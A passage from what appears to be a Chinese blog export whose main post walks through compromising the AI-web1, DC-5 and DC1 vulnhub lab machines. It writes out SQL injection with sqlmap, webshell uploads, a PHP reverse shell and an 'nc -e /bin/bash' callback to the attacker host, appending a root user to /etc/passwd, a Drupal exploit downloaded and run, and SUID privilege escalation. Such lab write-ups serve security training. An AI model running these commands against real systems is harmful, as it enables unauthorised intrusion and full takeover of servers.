<h2 id="关于🌇"><a href="#关于🌇" class="headerlink" title="关于🌇"></a>关于🌇</h2><table>
<thead>
<tr>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100338097_iOS.jpg"></th>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221112_092603320_iOS.jpg" alt="20221112_092603320_iOS"></th>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220621_110111436_iOS.jpg"></th>
</tr>
</thead>
<tbody><tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207144624211.png" alt="image-20221207144624211"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100927998_iOS.jpg"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100924916_iOS.jpg"></td>
</tr>
<tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220905_103525175_iOS.jpg"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100338097_iOS.jpg"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220630_111017267_iOS.jpg"></td>
</tr>
</tbody></table>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100528363_iOS.jpg" alt="20220916_100528363_iOS" style="zoom: 25%;">



<h2 id="关于世界"><a href="#关于世界" class="headerlink" title="关于世界"></a>关于世界</h2><p>未知…</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>照片</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub</title>
    <url>/2022/09/30/vulnhub/</url>
    <content><![CDATA[<h1 id="AI-web1"><a href="#AI-web1" class="headerlink" title="AI-web1"></a>AI-web1</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>只要使靶机与kali处于同一网段即可</p>
<h2 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h2><p>在kali中使用</p>
<pre><code class="hljs sh">netdiscover  <span class="hljs-comment"># 可以探测出与kali处于同一网段中存活的主机</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929233618239.png" alt="image-20220929233618239"></p>
<p>由图中的信息可以看到靶机的ip地址为<code>192.168.152.133</code></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用nmap扫描指定的ip</p>
<pre><code class="hljs sh">nmap -sS -sV -A -n 192.168.152.133</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929233830903.png" alt="image-20220929233830903"></p>
<p>扫描结果显示靶机的80端口开放，并且探测到url，使用的中间件为apache</p>
<p>访问  <code>m3diNf0/</code>和<code>/se3reTdir777/uploads/</code>，没有有用信息，继续扫描路径</p>
<pre><code class="hljs sh">dirb http://192.168.152.133/m3diNf0/
dirb http://192.168.152.133/se3reTdir777/uploads/
dirb http://192.168.152.133/se3reTdir777/</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234638450.png" alt="image-20220929234638450"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234645788.png" alt="image-20220929234645788"></p>
<p>扫描两个可访问的的url，在浏览器中打开，info.php中是phpinfo的信息，其中有一个信息很有用就是，网站的根目录</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234927206.png" alt="image-20220929234927206"></p>
<p>而<code>http://192.168.152.133/se3reTdir777/index.php</code>，是一个用户查询的接口，很明显像是sql注入，直接用sqlmap扫</p>
<pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span>
sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --dbs
sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 --tables
sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user -columns</code></pre>

<p>最后获得结果并没有什么用，但是可以尝试使用sqlmap获取shell权限</p>
<pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --level=3 --os-shell</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929235903463.png" alt="image-20220929235903463"></p>
<p>能够获取shell权限，但是权限很低，只是www-data</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>前文我们已经知道网站绝对路径，其实就就是可以尝试sqlmap的文件上传</p>
<p>将一句话木马上传到网站的根目录中</p>
<pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> --data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</code></pre>

<p>上传成功后使用工具连接即可</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930000537720.png" alt="image-20220930000537720"></p>
<p>此时已经获取到了网站的控制权，但是权限依然很低，因此需要进行提权</p>
<p>为了操作方便，需要先反弹shell</p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>首先在kali中监听4444端口</p>
<pre><code class="hljs sh">nv -lvvp 4444</code></pre>

<p>然后在网站中上传一个php文件</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$sock</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-string">&quot;192.168.152.130&quot;</span>,<span class="hljs-number">4444</span>);
<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>上传成功后，执行该文件</p>
<pre><code class="hljs sh">php web.php</code></pre>

<p>即可获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先在kali中使用openssl创建一个用户</p>
<pre><code class="hljs sh">openssl passwd -1 -salt hacker 123456</code></pre>

<p>将该用户加入到root组中，既可拥有root权限(在反弹的shell中执行该命令)</p>
<pre><code class="hljs sh">hacker:$1$hacker<span class="hljs-variable">$6luIRwdGpBvXdP</span>.GMwcZp/:0:0::/root:/bin/bash</code></pre>

<p>将该用户的信息写入到<code>/etc/passwd</code>中，就想当于在靶机中创建了一个root用户权限的用户</p>
<pre><code class="hljs sh">ehco <span class="hljs-string">&#x27;sun:$1$sun$DD5cShz08xZBESgMJhDRY.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</code></pre>

<p>切换用户</p>
<pre><code class="hljs sh">su hacker</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930002110117.png" alt="image-20220930002110117"></p>
<h2 id="读取flag"><a href="#读取flag" class="headerlink" title="读取flag"></a>读取flag</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929122622040.png" alt="image-20220929122622040"></p>
<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>运行虚拟机后，将kali与靶机配置到同一网卡下即可</p>
<p>kali的ip地址：<code>192.168.56.101</code></p>
<h2 id="网络嗅探-1"><a href="#网络嗅探-1" class="headerlink" title="网络嗅探"></a>网络嗅探</h2><p>在kali中使用netdiscover发现当前网络中存活的主机</p>
<pre><code class="hljs sh">netdiscover -i eth0</code></pre>

<p>探测到靶机的ip地址为：<code>192.168.56.102</code></p>
<p>再使用nmap扫描开放的服务端口</p>
<pre><code class="hljs sh">nmap -sS -sV -A -n 192.168.56.102</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930163714244.png" alt="image-20220930163714244"></p>
<p>可以看到靶机的80端口是开启的，直接访问。</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>网页中存在一个留言板<code>http://192.168.220.139/contact.php</code></p>
<p>提交留言信息会跳转到<code>http://192.168.56.102/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=1</code></p>
<p>此时再次刷新页面，会发现右下角的copyright会发生变化</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930164227501.png" alt="image-20220930164227501"></p>
<p>首先使用dirb 去探测网站中的所有url，但是效果不好只能探测到index.php</p>
<p>那么就用bp的intruder模块加载自己的字典进行路劲爆破，最后爆破结果如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930172927445.png" alt="image-20220930172927445"></p>
<p>这里的footer是网页源码中没有暴露的页面。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930173042421.png" alt="image-20220930173042421"></p>
<p>由于footer.php的内容可以显示子再thankyou.php中，那么thankyou.php一定是包含了footer.php，那么下面的要找出thankyou.php包含文件的参数是什么</p>
<p>尝试</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?page=footer.php
http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?file=footer.php</code></pre>

<p>发现以上两个参数都可以正常访问</p>
<p>接下来就是尝试文件包含漏洞</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>上面已经发现页面存在文件包含，很直观的想法就是看能否将<code>/etc/passwd</code>读取到</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930232717029.png" alt="image-20220930232717029"></p>
<pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span> <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span> systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span> systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Bus</span> <span class="hljs-title class_">Proxy</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-title class_">Debian</span>-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">dc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dc</span>,,,<span class="hljs-symbol">:/home/dc</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:MySQL</span> <span class="hljs-title class_">Server</span>,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span></code></pre>



<p>从http的响应头可以看到网站使用的中间件是nginx，那么可尝试获取去nginx的日志文件，默认绝对路径为<code>/var/log/nginx/access.log</code></p>
<p>使用url<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001160016500.png" alt="image-20221001160016500"></p>
<p>这里一定得要用bp，不然会由于浏览器的自动编码导致失效</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001105755300.png" alt="image-20221001105755300"></p>
<p>能够发现刚才的访问记录已经被写入到了日志文件中</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930234744268.png" alt="image-20220930234744268"></p>
<p><strong>PHP中造成文件包含的四个函数</strong></p>
<blockquote>
<p><strong>1、include() 、require()</strong></p>
<p><strong>当使用include()函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</strong></p>
<p><strong>当使用require()函数包含文件时，只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息，并且终止脚本的运行</strong></p>
<p><strong>2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。</strong></p>
<p><strong>require_once()功能和require()相同，区别在于当重复调用同一文件时，程序只调用一次。</strong></p>
<p>​       <strong>当使用上述四个函数包含一个新文件时，该文件将作为 PHP 代码执行，php 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 url、也都将作为 PHP 代码执行。</strong></p>
</blockquote>
<p>一句话木马上传成功后，就可以使用蚁剑连接了</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span><span class="hljs-regexp">/thankyou.php?file=/</span>var<span class="hljs-regexp">/log/</span>nginx/access.log
密码：<span class="hljs-number">666</span></code></pre>

<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>再kali中监听4444端口</p>
<pre><code class="hljs sh">nc -lvvp 4444</code></pre>

<p>再蚁剑的终端中执行</p>
<pre><code class="hljs sh">nc  -e  /bin/bash  192.168.56.101 4444</code></pre>

<p>此时已经获取shell</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113341268.png" alt="image-20221001113341268"></p>
<p>使用python的反弹shell</p>
<pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre>

<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>使用find命令，查找具有suid权限的命令，发现screen-4.5.0</p>
<pre><code class="hljs sh">find / -perm /4000 2 &gt; /dev/null</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113542405.png" alt="image-20221001113542405"></p>
<p>那么就可以查找可用于screen 4.5.0的漏洞脚本文件，再kali中查找</p>
<pre><code class="hljs sh">searchsploit screen 4.5.0</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113845331.png" alt="image-20221001113845331"></p>
<p>将脚本拷贝到当前工作目录</p>
<pre><code class="hljs sh"><span class="hljs-built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/41154.sh  41154.sh

<span class="hljs-built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/41152.txt  41152.txt</code></pre>

<p>尝试从蚁剑上传到网站的根目录，但是发现权限不够，最后再&#x2F;tmp目录上传成功</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120350730.png" alt="image-20221001120350730"></p>
<p>加上可执行权限即可</p>
<pre><code class="hljs sh"><span class="hljs-built_in">chmod</span> +x 41154.sh</code></pre>

<p>在kali中的shell执行</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120551421.png" alt="image-20221001120551421"></p>
<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><p>进入root目录即可获取到flag</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120217058.png" alt="image-20221001120217058"></p>
<h1 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>将靶机与kali放在同一网卡下实现相互通信即可</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用</p>
<pre><code class="hljs sh">arp-scan -l
netdiscover -eth0</code></pre>

<p>发现目标靶机的ip地址为<code>192.168.56.103</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005124337784.png" alt="image-20221005124337784"></p>
<p>直接方位该ip地址，发现是可访问的网站，但是需要密码无法进入</p>
<p>但是很明显可以看出此网站使用的CMS为Drupal,那么就寻找与该CMS存在的漏洞即可</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005125020123.png" alt="image-20221005125020123"></p>
<p>可以看到关于drupal 的漏洞有七个，但是我们需要选择最新的且等级为excellent的</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里使用的是<code>exploit/multi/http/drupal_drupageddon</code></p>
<pre><code class="hljs sh">use exploit/multi/http/drupal_drupageddon
<span class="hljs-built_in">set</span> RHOSTS 192.168.56.103
<span class="hljs-built_in">set</span> LHOST 192.168.56.101
run</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005130958089.png" alt="image-20221005130958089"></p>
<p>网站的根目录中存在一个flag1.txt，其中提示</p>
<pre><code class="hljs gradle"><span class="hljs-keyword">Every</span> good CMS needs a config <span class="hljs-keyword">file</span> - and so <span class="hljs-keyword">do</span> you.</code></pre>

<p>那么就是找cms的配置文件，而drupal的默认配置文件位置 <code>/var/www/sites/default/settings.php</code></p>
<p>查看此配置文件，可以看到mysql数据库的账号密码</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005131437953.png" alt="image-20221005131437953"></p>
<p>并且出现了flag2</p>
<blockquote>
<p>翻译:蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么?</p>
</blockquote>
<h2 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h2><p>在msfconsole中获取shell后使用执行下面这句话</p>
<pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>
连接数据库

mysql -udbuser -p</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005133337362.png" alt="image-20221005133337362"></p>
<p>密码是加密后保存到数据库的。但是在<code>/var/www/script</code>中发现了将密码转换为hash的脚本，可以使用脚本生成自己的密码的hash然后保存到数据库中，可惜的是该标本的环境存在问题，无法运行</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005134059498.png" alt="image-20221005134059498"></p>
<p>百度以下<code>drupal 密码</code>相关的问题，发现有重置admin密码的方法</p>
<blockquote>
<p>password的SHA-512加密运算的结果“$S$CDbdwZvjHQ09IVRs88G0fnaxPr50&#x2F;kb81YI9.8M&#x2F;D9okW7J&#x2F;s5U4”；</p>
</blockquote>
<p>那么就是在数据库中更新admin的密码即可</p>
<pre><code class="hljs mysql">update users set pass = &#x27;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4&#x27; where name = &#x27;admin&#x27;;</code></pre>

<p>登录后在网站中发现了flag3</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135247304.png" alt="image-20221005135247304"></p>
<blockquote>
<p>特殊的PERMS将帮助查找passwd -但您需要-exec该命令来找出如何获取阴影中的内容。</p>
</blockquote>
<p>在<code>home/flag4</code>中看到flag4</p>
<blockquote>
<p>Can you use this same method to find or access the flag in root?</p>
<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
<p>您可以使用相同的方法在根目录中查找或访问标志吗?</p>
<p>可能。但也许并没有那么容易。也许是这样?</p>
</blockquote>
<p><strong>使用CVE2014-3704添加管理账号</strong></p>
<p>在exploit-db中有可以直接利用的EXP，可以直接添加管理账号<br>地址：<a href="https://www.exploit-db.com/exploits/34992">https://www.exploit-db.com/exploits/34992</a></p>
<p>在kali中开启web服务，然后再靶机中下载该exp</p>
<pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005142802768.png" alt="image-20221005142802768"></p>
<pre><code class="hljs awk">靶机端下载
wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.101</span>/<span class="hljs-number">34992</span>.py
靶机端运行
python <span class="hljs-number">34992</span>.py -t http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.103</span>/ -u hack -p root</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005143232685.png" alt="image-20221005143232685"></p>
<p>直接使用hack 登录</p>
<h2 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h2><p>使用find找下具有root权限的suid</p>
<pre><code class="hljs sh">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null  <span class="hljs-comment"># 这句也可以</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135623191.png" alt="image-20221005135623191"></p>
<p>可以发现find命令可以用来提权</p>
<p>尝试使用find执行命令</p>
<pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;whoami&quot;</span> \; <span class="hljs-comment"># 注意这里的-name 后的参数需要是存在的文件</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141313251.png" alt="image-20221005141313251"></p>
<p>这里执行的结果可以看出find是可以提权的</p>
<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>直接使用执行 <code>/bin/sh</code></p>
<pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141539383.png" alt="image-20221005141539383"></p>
]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>xss和sql注入简单环境的搭建</title>
    <url>/2020/11/15/xss-sql/</url>
